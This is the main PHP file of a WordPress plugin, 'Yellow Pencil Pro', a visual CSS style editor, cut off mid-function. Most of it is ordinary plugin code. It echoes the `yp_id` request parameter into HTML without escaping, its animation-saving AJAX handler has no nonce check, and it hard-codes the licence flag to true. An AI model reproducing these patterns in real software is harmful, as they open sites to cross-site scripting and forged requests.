<?php
/*
Plugin Name: WaspThemes - Yellow Pencil Pro
Plugin URI: http://waspthemes.com/yellow-pencil
Description: Customize your WordPress site in minutes and keep the site design under your control with 100% front-end Style Editor. 
Version: 5.5.9
Author: WaspThemes
Author URI: http://www.waspthemes.com
*/


/* ---------------------------------------------------- */
/* Basic 												*/
/* ---------------------------------------------------- */
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}


/* ---------------------------------------------------- */
/* Check if lite version or not. 						*/
/* ---------------------------------------------------- */
if(strstr(__FILE__,"yellow-pencil-visual-theme-customizer")){
	$lite_dir = __FILE__;
	$currentVersion = 'lite';
	$pro_dir = str_replace("yellow-pencil-visual-theme-customizer", "waspthemes-yellow-pencil", __FILE__);
}else{
	$pro_dir = __FILE__;
	$currentVersion = 'pro';
	$lite_dir = str_replace("waspthemes-yellow-pencil", "yellow-pencil-visual-theme-customizer", __FILE__);
}

// Checking if files exists
$pro_exists = file_exists($pro_dir);
$lite_exists = file_exists($lite_dir);

// If pro version is there?
if($pro_exists == true && $lite_exists == true){

	// Be sure deactivate_plugins function is exists
	if(!function_exists("deactivate_plugins")){
		require_once(ABSPATH .'wp-admin/includes/plugin.php');
	}

	// deactivate Lite Version.
	deactivate_plugins(plugin_basename($lite_dir));

}

// Generate Base Editor URL.
function yp_uri(){
	if(current_user_can("edit_theme_options") == true){
		return admin_url('admin.php?page=yellow-pencil-editor');
	}elseif(defined('WT_DEMO_MODE')){
		return add_query_arg(array('yellow_pencil' => 'true'),get_home_url().'/');
	}
}


/* ---------------------------------------------------- */
/* Define 												*/
/* ---------------------------------------------------- */
define( 'WT_PLUGIN_DIR', plugin_dir_path( __FILE__ ) );
define( 'WT_PLUGIN_URL', plugin_dir_url( __FILE__ ) );


define( 'YP_MODE', "min"); // min & dev.
define( 'YP_VERSION', "5.5.9");
define('WTFV', TRUE);
//define( 'YP_HTML_EDITOR', TRUE);


// Load HTML Editor
if(defined('YP_HTML_EDITOR')){
	include( WT_PLUGIN_DIR . 'html-editor/html.php' );
}


// Check for free trial
$trialStatus = get_option('yp_activate_free_trial');
$trialTime = get_option('yp_activate_free_trial_time');


// Check trail version.
if($trialStatus == 'true' && $currentVersion == 'lite'){

	$currentTime = time();
	$dif = $currentTime - $trialTime;

	// Time Check
	if(($dif / 60) <= 2880){

		define('WTFV', TRUE);

	}else{

		update_option('yp_activate_free_trial_end','true');
		update_option('yp_activate_free_trial','false');

	}

}



/* ---------------------------------------------------- */
/* Add animation ajax callback							*/
/* ---------------------------------------------------- */
function yp_add_animation(){

	if(current_user_can("edit_theme_options") == true){

		$css = wp_strip_all_tags($_POST['yp_anim_data']);
		$name = wp_strip_all_tags($_POST['yp_anim_name']);

		if(!update_option("yp_anim_".$name,$css)){
			add_option("yp_anim_".$name,$css);
		}

	}

}

add_action( 'wp_ajax_yp_add_animation', 'yp_add_animation' );




/* ---------------------------------------------------- */
/* Get Translation Text Domain							*/
/* ---------------------------------------------------- */
function yp_plugin_lang(){
	load_plugin_textdomain( 'yp', false, dirname(plugin_basename( __FILE__ )) . '/languages' ); 
}
add_action( 'plugins_loaded', 'yp_plugin_lang' );




/* ---------------------------------------------------- */
/* Add a customize link in wp plugins page				*/
/* ---------------------------------------------------- */
function yp_customize_link($links,$file){

    if($file == plugin_basename(dirname(__FILE__) . '/yellow-pencil.php')){
        $in = '<a style="color:rgb(64, 113, 64);font-weight:600;" href="'.admin_url('themes.php?page=yellow-pencil').'">' . __('Customize','yp') . '</a>';
        array_unshift($links, $in);
    }
    return $links;
}

add_filter( 'plugin_action_links', 'yp_customize_link', 10, 2 );



/* ---------------------------------------------------- */
/* GET UPDATE API 			   							*/
/* ---------------------------------------------------- */

// Get Version
function yp_version($v){
	$v = preg_replace('/[^0-9]/s', '', $v);
	if(strlen($v) == 2){
		return $v."0";
	}elseif(strlen($v) == 1){
		return $v."00";
	}else{
		return $v;
	}
}

// Need include plugin.php file
if(!function_exists("get_plugin_data")){
	require_once(ABSPATH .'wp-admin/includes/plugin.php');
}

// Get Plugin Version
$yp_plugin_data = get_plugin_data( __FILE__ );
define("YP_PLUGIN_VERSION",yp_version($yp_plugin_data['Version']));

// Include Update Api.
require_once(WT_PLUGIN_DIR.'/library/php/update-api.php');	



/* ---------------------------------------------------- */
/* Get Font Families   									*/
/* ---------------------------------------------------- */
function yp_load_fonts(){
	$css = yp_get_css(true);
	yp_get_font_families($css,null);
}



/* ---------------------------------------------------- */
/* Getting font Families By CSS OUTPUT					*/
/* ---------------------------------------------------- */
// Type null = 'wp_enqueue_style'
// Type import = 'import'
// Type = wp_enqueue_style OR return @import CSS
function yp_get_font_families($css,$type){
	
	$protocol = is_ssl() ? 'https' : 'http';
	
	preg_match_all('/font-family:(.*?);/', $css, $r);

	foreach($r['1'] as &$k){
		$k = yp_font_name($k);
	}

	$importArray = array();
	
	foreach(array_unique($r['1']) as $family){
		
		$id = str_replace("+", "-", strtolower($family));

		$id = str_replace("\\", "", $id);

		if($id == 'arial' || $id == 'helvetica' || $id == 'georgia' || $id == 'serif' || $id == 'helvetica-neue' || $id == 'times-new-roman' || $id == 'times' || $id == 'sans-serif' || $id == 'arial-black' || $id == 'gadget' || $id == 'impact' || $id == 'charcoal' || $id == 'tahoma' || $id == 'geneva' || $id == 'verdana' || $id == 'inherit'){
			return false;
		}

		if($id == '' || $id == ' '){
			return false;
		}

		// Getting fonts from google api.
		if($type == null){
			wp_enqueue_style($id, esc_url(''.$protocol.'://fonts.googleapis.com/css?family='.$family.':300,300italic,400,400italic,500,500italic,600,600italic,700,700italic'));
		}else{
			array_push($importArray,esc_url(''.$protocol.'://fonts.googleapis.com/css?family='.$family.':300,300italic,400,400italic,500,500italic,600,600italic,700,700italic'));
		}
		
	}

	if($type != null){
		return $importArray;
	}
	
}



/* ---------------------------------------------------- */
/* Finding Font Names From CSS data     				*/
/* ---------------------------------------------------- */
function yp_font_name($a){
	
	$a = str_replace(

		array(

			"font-family:",
			'"',
			"'",
			" ",
			"+!important",
			"!important",

		),

		array(

			"",
			"",
			"",
			"+",
			"",
			"",

		),

	$a);
	
	if(strstr($a,",")){
		$array = explode(",",$a);
		return $array[0];
	}else{
		return $a;
	}

}



/* ---------------------------------------------------- */
/* Checking current user can or not						*/
/* ---------------------------------------------------- */
function yp_check_let(){
	
	// If Demo Mode
	if(defined("WT_DEMO_MODE") == true && isset($_GET['yellow_pencil_frame']) == true){
		return true;
	}
	
	// If user can.
	if(current_user_can("edit_theme_options") == true){
		return true;
	}else{
		return false;
	}
	
}



/* ---------------------------------------------------- */
/* Checking current user can or not (FOR FRAME)			*/
/* ---------------------------------------------------- */
function yp_check_let_frame(){
	
	// If Demo Mode
	if(defined("WT_DEMO_MODE") == true && isset($_GET['yellow_pencil_frame']) == true){
		return true;
	}
	
	// Be sure, user can.
	if(current_user_can("edit_theme_options") == true && isset($_GET['yellow_pencil_frame']) == true){
		return true;
	}else{
		return false;
	}
	
}



/* ---------------------------------------------------- */
/* Getting Last Post Title 								*/
/* ---------------------------------------------------- */
function yp_getting_last_post_title(){
	$last = wp_get_recent_posts(array("numberposts" => 1,"post_status" => "publish"));

	if(isset($last['0']['ID'])){
		$last_id = $last['0']['ID'];
	}else{
		return false;
	}

	$title = get_the_title($last_id);

	if(strstr($title," ")){
		$words = explode(" ", $title);
		return $words[0];
	}else{
		return $title;
	}

}



/* ---------------------------------------------------- */
/* Clean protocol from URL 								*/
/* ---------------------------------------------------- */
function yp_urlencode($v){
	$v = explode("://",urldecode($v));
	return urlencode($v[1]);
}



/* ---------------------------------------------------- */
/* Register Admin Script								*/
/* ---------------------------------------------------- */
function yp_enqueue_admin_pages($hook){
	
	// Post pages.
	if('posts.php' == $hook){
    	wp_enqueue_script('yellow-pencil-admin', plugins_url( 'js/admin.js' , __FILE__ ), 'jquery', '1.0', TRUE);
    }

    global $currentVersion;
    global $pro_exists;
    $trialEnd = get_option('yp_activate_free_trial_end');

    // admin deactivate popup
    if ( 'plugins.php' == $hook && $trialEnd != 'true' && $currentVersion == 'lite' && $pro_exists == false) {
        wp_enqueue_script('yellow-pencil-deactivate-popup', plugins_url( 'js/deactivate-popup.js' , __FILE__ ), 'jquery', '1.0', TRUE);
    }

    // Admin css
    wp_enqueue_style('yellow-pencil-admin', plugins_url( 'css/admin.css' , __FILE__ ));
	
}

add_action( 'admin_enqueue_scripts', 'yp_enqueue_admin_pages' );




/* ---------------------------------------------------- */
/* Register Plugin Styles For Iframe					*/
/* ---------------------------------------------------- */
function yp_styles_frame() {
		
	$protocol = is_ssl() ? 'https' : 'http';

	// Google web fonts.
	wp_enqueue_style('yellow-pencil-font', ''.$protocol.'://fonts.googleapis.com/css?family=Open+Sans:400,600,800');

	// Frame styles
	wp_enqueue_style('yellow-pencil-frame', plugins_url( 'css/frame.css' , __FILE__ ));
	
	// animate library.
	wp_enqueue_style('yellow-pencil-animate', plugins_url( 'library/css/animate.css' , __FILE__ ));
	
}




/* ---------------------------------------------------- */
/* Adding Link To Admin Appearance Menu					*/
/* ---------------------------------------------------- */
function yp_menu() {
	add_theme_page('Yellow Pencil Editor', 'Yellow Pencil Editor', 'edit_theme_options', 'yellow-pencil', 'yp_menu_function',999);
}



/* ---------------------------------------------------- */
/* Appearance page Loading And Location					*/
/* ---------------------------------------------------- */
function yp_menu_function(){

	$yellow_pencil_uri = yp_uri();
	
	// Background
	echo '<div class="yp-bg"></div>';
	
	// Loader
	echo '';
	
	// Background and loader CSS
	echo '<style>html,body{display:none;}</style>';
	
	// Location..
	echo '<script type="text/javascript">window.location = "'.add_query_arg(array('href' => yp_urlencode(get_home_url().'/')),$yellow_pencil_uri).'";</script>';
	
	// Die
	exit;
	
}

add_action('admin_menu', 'yp_menu');



/* ---------------------------------------------------- */
/* Sub string after 18chars								*/
/* ---------------------------------------------------- */
function yp_get_short_title($title){

	$title = ucfirst(strip_tags($title));

	if($title == ''){
		$title = 'Untitled';
	}

	if(strlen($title) > 18){
		return mb_substr($title,0,18,'UTF-8').'..';
	}else{
		return $title;
	}

}



/* ---------------------------------------------------- */
/* Getting All Title For Tooltip						*/
/* ---------------------------------------------------- */
function yp_get_long_tooltip_title($title){

	$title = ucfirst(strip_tags($title));

	if($title == '' || strlen($title) < 18){
		return false;
	}

	if(strlen($title) > 18){
		return $title;
	}

}



/* ---------------------------------------------------- */
/* Register Yellow Pencil Panel							*/
/* ---------------------------------------------------- */
function yp_yellow_penci_bar() {

	$yellow_pencil_uri = yp_uri();


	// Get protocol
	$protocol = is_ssl() ? 'https' : 'http';

	// Href
	$hrefA = $_GET['href'];

	// Update protocol.
	if(strstr($hrefA,'://') == true){
		$hrefNew = explode("://",$hrefA);
		$hrefNew = $protocol.'://'.$hrefNew[1];
	}elseif(strstr($hrefA,'://') == false){
		$hrefNew = $protocol.'://'.$hrefA;
	}

	// Filter
	$hrefNew = esc_url($hrefNew);


	$liveLink = add_query_arg(array('yp_live_preview' => 'true'),$hrefNew);

	if(isset($_GET['yp_id'])){
		$liveLink = add_query_arg(array('yp_id' => $_GET['yp_id']),esc_url($liveLink));
	}elseif(isset($_GET['yp_type'])){
		$liveLink = add_query_arg(array('yp_type' => $_GET['yp_type']),esc_url($liveLink));
	}

	$liveLink = str_replace("#038;yp_live_preview", "&amp;yp_live_preview", $liveLink);
	
    echo "<div class='yp-select-bar yp-disable-cancel'>
		<div class='yp-editor-top'>
			
			<div class='yp-non-html-mode'>
				<a href='".$hrefNew."' class='wf-close-btn-link'><span data-toggle='tooltip' data-placement='left' title='".__('Close Editor','yp')."' class='yp-close-btn'></span></a>

				<a class='yp-button yp-save-btn'>".__('Save','yp')."</a>

				<a data-toggle='tooltipTopBottom' data-placement='bottom' title='".__('Reset Changes','yp')."' class='yp-button-reset'></a>

				<a target='_blank' data-href='".$liveLink."' data-toggle='tooltipTopBottom' data-placement='bottom' title='".__('Live Preview','yp')."' class='yp-button-live'></a>
				
				<div class='yp-clearfix'></div>
			</div>

			<div class='yp-html-mode'>
				<span class='style-editor-title'>Style Editor</span>
				<a class='yp-button yp-hide-style-editor'><span class='dashicons dashicons-yes'></span></a>
			</div>
			
		</div>";
		
		// Set variables.
		$tag_id = null;
		$category_id = null;
		$last_post_id = null;
		$last_portfolio_id = null;
		$last_page_id = null;
		
		// Getting tags
		$tags = get_tags(array('orderby' => 'count', 'order' => 'DESC','number'=> 1 ));
		if(empty($tags) == false){
			$tag_id = $tags[0];
		}
		
		// Getting categories
		$categories = get_categories(array('orderby' => 'count', 'order' => 'DESC','number'=> 1 ));
		if(empty($categories) == false){
			$category_id = $categories[0];
		}
		
		// Set null to variables.
		$category_page = '';
		$homepage = '';
		$global_current_page = '';
		$global_current_page_url = '';
		$tag_page = '';
		$is_type = '';
		$is_id = '';
		$all_singles = '';
		$all_pages = '';
		$gb_category_active = false;
		$gb_tag_active = false;
		$editingHas = '0';
		
		// Checking if its is a type
		if(isset($_GET['yp_type'])){
			$is_type = $_GET['yp_type'];
		}
		
		// Checking if its id.
		if(isset($_GET['yp_id'])){
			$is_id = $_GET['yp_id'];
		}
		
		// Getting current URL
		if(is_ssl()){
			$current_url = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		}else{
			$current_url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		}
	
		// Category Page
		if($category_id != '' && $category_id != null){
			
			$url = add_query_arg(array('href' => yp_urlencode(get_term_link($category_id))),$yellow_pencil_uri);
			
			$active = '';
			if($current_url == $url){
				$active = ' class="active" ';
				$editingHas = '1';
				$gb_category_active = true;
			}
			
			$category_page = '<li'.$active.'><a href="'.esc_url($url).'">'.__("Category Page","yp").'</a></li>';
			
		}

		// if is global, try to add current page to global section.
		if(isset($_GET['yp_id']) == false && isset($_GET['yp_type']) == false && $editingHas == 0){

			$postid = url_to_postid($hrefNew);

			if($postid != null){

				$url = add_query_arg(array('href' => yp_urlencode(get_permalink($postid))),$yellow_pencil_uri);

				$global_current_page = '<li class="active"><a data-toggle="tooltip" data-placement="left" title="'.yp_get_long_tooltip_title(get_the_title($postid)).'" href="'.esc_url($url).'">'.yp_get_short_title(get_the_title($postid)).'</a></li>';
				$global_current_page_url = esc_url($url);

			}else if($gb_category_active == false && $gb_tag_active == false){

				$global_current_page = '<li class="active"><a>Unknown Page</a></li>';
				$global_current_page_url = '';

			}

		}

		// tag Page
		if($tag_id != '' && $tag_id != null){
			
			$url = add_query_arg(array('href' => yp_urlencode(get_term_link($tag_id))),$yellow_pencil_uri);
			
			$active = '';
			if($current_url == $url){
				$active = ' class="active" ';
				$editingHas = '1';
				$gb_tag_active = true;
			}
			
			$tag_page = '<li'.$active.'><a href="'.esc_url($url).'">'.__("Tag Page","yp").'</a></li>';
			
		}
		
		// Home Page
		if($global_current_page_url != $url){
			$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_home_url().'/'))),$yellow_pencil_uri);
				
			$active = '';
			if($current_url == $url){
				$active = ' class="active" ';
				$global_current_page = '';
				$editingHas = '1';
			}
				
			$homepage = '<li'.$active.'><a href="'.esc_url($url).'">'.__("Home","yp").'</a></li>';

		}

		
		// Getting pages with custom templates.
		$args = array(
			'posts_per_page' => 8,
			"post_status" => "publish",
		    'post_type' => 'page',
		    'meta_query' => array(
		        array(
		            'key' => '_wp_page_template',
		            'value' => 'default',
					'compare' => '!='
				)
			)
		);

		$other_pages = get_posts($args);
		$c = 1;
		$current_pages_id = array();
		foreach($other_pages as $page){

			$c++;

			array_push($current_pages_id, $page->ID);
			
			$url = add_query_arg(array('href' => yp_urlencode(get_permalink($page->ID)), 'yp_id' => $page->ID),$yellow_pencil_uri);
			
			$active = '';
			if($current_url == $url){
				$active = ' class="active" ';
				$editingHas = '1';
			}

			$title = $page->post_title;

			if($title == '' || $title == ' '){
				$title = 'Untitled';
			}
		
			$all_pages .= '<li'.$active.' id="page-'.esc_attr($page->ID).'-btn"><a data-toggle="tooltip" data-placement="left" title="'.yp_get_long_tooltip_title($title).'" href="'.esc_url($url).'">'.yp_get_short_title($title).'</a></li>';
			
		}

		// First get pages with templates,
		// if there not more 6 page templates,
		// so show normal pages.
		if($c < 6){
			// Getting all pages.
			$args = array(
				'posts_per_page' => (6-$c),
				"post_status" => "publish",
			    'post_type' => 'page',
			    'exclude' => $current_pages_id
			);

			$other_pages = get_posts($args);

			foreach($other_pages as $page){

				$url = add_query_arg(array('href' => yp_urlencode(get_permalink($page->ID)), 'yp_id' => $page->ID),$yellow_pencil_uri);
				
				$active = '';
				if($current_url == $url){
					$active = ' class="active" ';
					$editingHas = '1';
				}

				$title = $page->post_title;

				if($title == '' || $title == ' '){
					$title = 'Untitled';
				}
				
				$all_pages .= '<li'.$active.' id="page-'.esc_attr($page->ID).'-btn"><a data-toggle="tooltip" data-placement="left" title="'.yp_get_long_tooltip_title($title).'" href="'.esc_url($url).'">'.yp_get_short_title($title).'</a></li>';
				
			}

		}

		// Search Page.
		$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_home_url()).'/?s='.yp_getting_last_post_title().'').'&yp_type=search'),$yellow_pencil_uri);
		$active = '';
		if($current_url == $url){
			$active = ' class="active" ';
			$editingHas = '1';
		}
		$all_singles .= '<li'.$active.' id="search-page-btn"><a href="'.esc_url($url).'">'.__("Search","yp").'</a></li>';

		// 404 Page.
		$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_home_url()).'/?p=987654321').'&yp_type=404'),$yellow_pencil_uri);
		$active = '';
		if($current_url == $url){
			$active = ' class="active" ';
			$editingHas = '1';
		}
		$all_singles .= '<li'.$active.' id="error-page-btn"><a href="'.esc_url($url).'">404</a></li>';

		// tag Page.
		if($tag_id != '' && $tag_id != null){
			$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_term_link($tag_id))).'&yp_type=tag'),$yellow_pencil_uri);
			$active = '';
			if($current_url == $url){
				$active = ' class="active" ';
				$editingHas = '1';
			}
			$all_singles .= '<li'.$active.' id="tag-page-btn"><a href="'.esc_url($url).'">'.__("Tag","yp").'</a></li>';
		}

		// Category Page.
		if($category_id != '' && $category_id != null){
			$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_term_link($category_id))).'&yp_type=category'),$yellow_pencil_uri);
			$active = '';
			if($current_url == $url){
				$active = ' class="active" ';
				$editingHas = '1';
			}
			$all_singles .= '<li'.$active.' id="category-page-btn"><a href="'.esc_url($url).'">'.__("Category","yp").'</a></li>';
		}

		// Author Page.
		$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_author_posts_url("1"))).'&yp_type=author'),$yellow_pencil_uri);
		$active = '';
		if($current_url == $url){
			$active = ' class="active" ';
			$editingHas = '1';
		}
		$all_singles .= '<li'.$active.' id="author-page-btn"><a href="'.esc_url($url).'">'.__("Author","yp").'</a></li>';



		// WordPress Panel
		$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_dashboard_url())).'&yp_type=wordpress_panel'),$yellow_pencil_uri);
		$active = '';
		if(substr_count($current_url, 'yp_type=wordpress_panel') >= 1){
			$active = ' class="active" ';
			$editingHas = '1';
			$all_singles .= '<li'.$active.' id="wordpress-panel-btn"><a href="'.esc_url($url).'">'.__("WordPress Panel","yp").'</a></li>';
		}


		// Home Page.
		$frontpage_id = get_option('page_on_front');
		if($frontpage_id == 0 || $frontpage_id == null){
			$url = add_query_arg(array('href' => yp_urlencode(esc_url(get_home_url().'/')).'&yp_type=home'),$yellow_pencil_uri);
			$active = '';
			if($current_url == $url){
				$active = ' class="active" ';
				$editingHas = '1';
			}
			$all_pages .= '<li'.$active.' id="page-page-home-btn"><a href="'.esc_url($url).'">'.__("Home Page","yp").'</a></li>';
		}


		$post_types = get_post_types(array(
		   'public'   => true,
		   '_builtin' => false
		));

		// Adding default post types.
		array_push($post_types, 'post');
		array_push($post_types, 'page');

		$pi = 0;
		foreach ($post_types as $post_type){

			$pi++;

				if($pi < 7){

				if($post_type == 'page'){
					$last_post = wp_get_recent_posts(array("post_status" => "publish","meta_key" => "_wp_page_template", "meta_value" => "default", "numberposts" => 1, "post_type" => $post_type));
				}else{
					$last_post = wp_get_recent_posts(array("post_status" => "publish","numberposts" => 1, "post_type" => $post_type));
				}

				if(empty($last_post) == false){

					$last_post_id = $last_post['0']['ID'];

					$url = add_query_arg(array('href' => yp_urlencode(get_permalink($last_post_id)), 'yp_type' => $post_type),$yellow_pencil_uri);

					$active = '';
					if(isset($_GET['yp_type'])){
						if($_GET['yp_type'] == $post_type){
						$active = ' class="active" ';
						$editingHas = '1';
						}
					}

					$all_singles .= '<li'.$active.' id="single-'.esc_attr($post_type).'-page-btn"><a href="'.esc_url($url).'">'.ucfirst($post_type).'</a></li>';

				}

			}

		}
		
		// Show editing page on all pages list.
		if(isset($_GET['yp_id'])){
			if($editingHas == '0'){
				$url = add_query_arg(array('href' => yp_urlencode(get_permalink($is_id)), 'yp_id' => $is_id),$yellow_pencil_uri);

				$title = get_the_title($is_id);

				if($title == '' || $title == ' '){
					$title = 'Untitled';
				}

				$all_pages .= '<li class="active" id="page-'.$is_id.'-btn"><a data-toggle="tooltip" data-placement="left" title="'.yp_get_long_tooltip_title($title).'" href="'.esc_url($url).'">'.yp_get_short_title($title).'</a></li>';
			}
		}elseif(isset($_GET['yp_type'])){
			if($editingHas == '0'){

				// Getting last post for current post type.
				if($is_type == 'page'){
					$last_post = wp_get_recent_posts(array("post_status" => "publish","meta_key" => "_wp_page_template", "meta_value" => "default", "numberposts" => 1, "post_type" => $is_type));
				}else{
					$last_post = wp_get_recent_posts(array("post_status" => "publish","numberposts" => 1, "post_type" => $is_type));
				}

				$last_post_id = $last_post['0']['ID'];

				$url = add_query_arg(array('href' => yp_urlencode(get_permalink($last_post_id)), 'yp_type' => $is_type),$yellow_pencil_uri);

				$title = $is_type;

				if($title == '' || $title == ' '){
					$title = 'Untitled';
				}

				$all_singles .= '<li class="active" id="page-'.$last_post_id.'-btn"><a data-toggle="tooltip" data-placement="left" title="'.yp_get_long_tooltip_title($title).'" href="'.esc_url($url).'">'.yp_get_short_title($title).'</a></li>';

			}
		}


		// Markup For Global Page Links etc.
		$other_pages = '<div class="yp-other-pages">
		<span data-toggle="popover" class="yp-start-info" title="'.__("Global Customize","yp").'" data-placement="left" data-content="'.__("Global changes will be loading on every page. Global customize ideal to edit 'Header', 'Footer', 'General Site Design' etc.","yp").'">'.__('Global Customize','yp').':</span>
		
		<ul class="yp-ul-global-list">'.$category_page.''.$homepage.''.$global_current_page.''.$tag_page.'</ul>';
		
		if($all_pages != '' && $all_pages != null){
		$other_pages .= '<span class="yp-other-other-pages yp-start-info" data-toggle="popover" title="'.__("Customize One Page","yp").'" data-placement="left" data-content="'.__("Use following links for apply changes to just one page.","yp").'">'.__('Customize One Page','yp').':</span>
		
		<ul class="yp-ul-all-pages-list">'.$all_pages.'</ul>'; }
		
		$other_pages .= '<span class="yp-start-info yp-other-other-pages" data-toggle="popover" title="'.__("Customize Templates","yp").'" data-placement="left" data-content="'.__("Use following links for edit Templates. Sample: 'all single posts', 'all product pages' etc.","yp").'">'.__('Customize Templates','yp').':</span>
		
		<ul class="yp-ul-single-list">'.$all_singles.'</ul></div>';
		

		// Default.
		echo '<div class="yp-no-selected"><div class="yp-hand"></div><div class="yp-hand-after"></div>'.__('Click on any element that you want to customize!','yp').' '.$other_pages.'<div class="yp-tip"><span class="dashicons dashicons-arrow-right"></span> '.__("Press to H key for hiding plugin panel.","yp").'</div></div>';
		

		// Options
		include( WT_PLUGIN_DIR . 'options.php' );
		
		
	echo "</div>";
	
}



/* ---------------------------------------------------- */
/* Getting Custom Animations Codes						*/
/* ---------------------------------------------------- */
function yp_get_custom_animations(){

	$all_options =  wp_load_alloptions();
	foreach($all_options as $name => $value){
		if(stristr($name, 'yp_anim')){

			// Get animations
			$value = stripslashes(yp_css_prefix($value));
    		$value = preg_replace('/\s+|\t/',' ',$value);

			echo "\n".'<style id="yp-animate-'.strtolower(str_replace("yp_anim_","",$name)).'">'."\n".''.$value."\n".str_replace("keyframes", "-webkit-keyframes", $value).''."\n".'</style>';

		}
	}

}



/* ---------------------------------------------------- */
/* Getting CSS Codes									*/
/* ---------------------------------------------------- */
/*
	yp get css(false) : echo output CSS
	yp get css(true) : return just CSS Codes.
*/
function yp_get_css($r = false){
	
	global $post;

	$onlyCSS = '';
	$get_type_option = '';
	$get_post_meta = '';
	
	global $wp_query;
	if(isset($wp_query->queried_object)){
		$id = @$wp_query->queried_object->ID;
	}else{
		$id = null;
	}

	if(class_exists( 'WooCommerce')){
		if(is_shop()){
			$id = wc_get_page_id('shop');
		}
	}
	
	$get_option = get_option("wt_css");
	if($id != null){
		$get_type_option = get_option("wt_".get_post_type($id)."_css");
		$get_post_meta = get_post_meta($id, '_wt_css', true);
	}
	
	if($get_option == 'false'){
		$get_option = false;
	}
	
	if($get_type_option == 'false'){
		$get_type_option = false;
	}
	
	if($get_post_meta == 'false'){
		$get_post_meta = false;
	}
	
	if(empty($get_option) == false){
		$onlyCSS .= $get_option;
	}
	
	if(empty($get_type_option) == false){
		$onlyCSS .= $get_type_option;
	}
	
	if(empty($get_post_meta) == false){
		$onlyCSS .= $get_post_meta;
	}

	if(is_author()){
		$onlyCSS .= get_option("wt_author_css");
	}elseif(is_tag()){
		$onlyCSS .= get_option("wt_tag_css");
	}elseif(is_category()){
		$onlyCSS .= get_option("wt_category_css");
	}elseif(is_404()){
		$onlyCSS .= get_option("wt_404_css");
	}elseif(is_search()){
		$onlyCSS .= get_option("wt_search_css");
	}

	// home.
	if(is_front_page() && is_home()){
		$onlyCSS .= get_option("wt_home_css");
	}
	
	
	if($onlyCSS != '' && $r == false){

		$return = '<style id="yellow-pencil">';
		$return .= "\r\n/*\r\n\tThe following CSS generated by Yellow Pencil Plugin.\r\n\thttp://waspthemes.com/yellow-pencil\r\n*/\r\n";

		// process
		$onlyCSS = stripslashes(yp_css_prefix(yp_animation_prefix(yp_hover_focus_match($onlyCSS))));

		// min and add
		$return .= str_replace(array("\n", "\r", "\t"), '', $onlyCSS);

		$return .= "\n".'</style>';

		echo $return;

	}
	
	if($r == true){
		return $onlyCSS;
	}
	
}


// If is dynamic inline.
if(get_option('yp-output-option') != 'external'){

	// Adding all CSS codes to WP Head if not live preview and editor page.
	if(isset($_GET['yellow_pencil_frame']) == false && isset($_GET['yp_live_preview']) == false){
		add_action('wp_head','yp_get_css',9999);
	}

	// Adding all CSS animations to WP Head.
	if(isset($_GET['yellow_pencil_frame']) == false){
		add_action('wp_head','yp_get_custom_animations',9999);
	}

}


// Adding all CSS animations to WP Head.
if(isset($_GET['yp_live_preview']) == true && get_option('yp-output-option') == 'external'){
	add_action('wp_head','yp_get_custom_animations',9999);
}



/* ---------------------------------------------------- */
/* Getting Live Preview CSS								*/
/* ---------------------------------------------------- */
function yp_get_live_css(){

	// Get recent generated CSS codes.
	$css = get_option('yp_live_view_css_data');

	if(empty($css)){
		return $css;
	}

	return stripslashes(yp_css_prefix(yp_animation_prefix(yp_hover_focus_match($css))));

}



/* ---------------------------------------------------- */
/* Getting fonts for live preview						*/
/* ---------------------------------------------------- */
function yp_load_fonts_for_live(){
	$css = yp_get_live_css();
	yp_get_font_families($css,null);
}



/* ---------------------------------------------------- */
/* Generating Live Preview data 						*/
/* ---------------------------------------------------- */
function yp_get_live_preview(){

	$css = yp_get_live_css();

	if(empty($css) == false){

		$css = '<style id="yp-live-preview">'.$css.'</style>';

		if($css != '<style id="yp-live-preview"></style>'){
			echo $css;
		}

	}

}



/* ---------------------------------------------------- */
/* Adding generated live preview CSS data To WP HEAD	*/
/* ---------------------------------------------------- */
if(isset($_GET['yp_live_preview']) == true){

	add_action('wp_head','yp_get_css_backend',9999);
	add_action('wp_head','yp_get_live_preview',9999);

}



/* ---------------------------------------------------- */
/* Hover/Focus System									*/
/* ---------------------------------------------------- */
/*
	Replace 'body.yp-selector-hover' to hover.
	replace 'body.yp-selector-focus' to focus.
	replace 'body.yp-selector-link' to link.
	replace 'body.yp-selector-active' to active.
	replace 'body.yp-selector-visited' to visited.
*/
function yp_hover_focus_match($data){

	preg_match_all('@body.yp-selector-(.*?){@si',$data,$keys);
	
	foreach($keys[1] as $key){

		$keyGet = substr($key, 0, 7);
		if($keyGet == 'visited'){
			$keyQ = $keyGet;
		}

		$keyGet = substr($key, 0, 6);
		if($keyGet == 'active'){
			$keyQ = $keyGet;
		}

		$keyGet = substr($key, 0, 4);
		if($keyGet == 'link'){
			$keyQ = $keyGet;
		}

		$keyGet = substr($key, 0, 5);
		if($keyGet == 'hover' || $keyGet == 'focus'){
			$keyQ = $keyGet;
		}

		$dir = 'body.yp-selector-'.$key;
		$dirt = 'body.yp-selector-'.$key.':'.$keyQ;

		$dirt = str_replace(array('body.yp-selector-hover','body.yp-selector-focus','body.yp-selector-visited','body.yp-selector-active','yp-selector-link'),array('body','body'),$dirt);
		$data = (str_replace($dir,$dirt,$data));
	}
	
	$data = str_replace('.yp-selected','',$data);
	
	return $data;
	
}



/* ---------------------------------------------------- */
/* Adding Prefix To Some CSS Rules						*/
/* ---------------------------------------------------- */
function yp_css_prefix($outputCSS){
	
	$outputCSS = preg_replace('@\t-webkit-(.*?):(.*?);@si',"",$outputCSS);

	// Adding automatic prefix to output CSS.
	$CSSPrefix = array(
		"border-radius",
		"border-top-left-radius",
		"border-top-right-radius",
		"border-bottom-left-radius",
		"border-bottom-right-radius",
		"animation-fill-mode",
		"animation-duration",
		"animation-name",
		"filter",
		"box-shadow",
		"box-sizing",
		"transform",
		"transition"
	);
		
	foreach($CSSPrefix as $prefix){
		$outputCSS = preg_replace('@'.$prefix.':([^\{]+);@U',"".$prefix.":$1;\r	-moz-".$prefix.":$1;\r	-webkit-".$prefix.":$1;",$outputCSS);
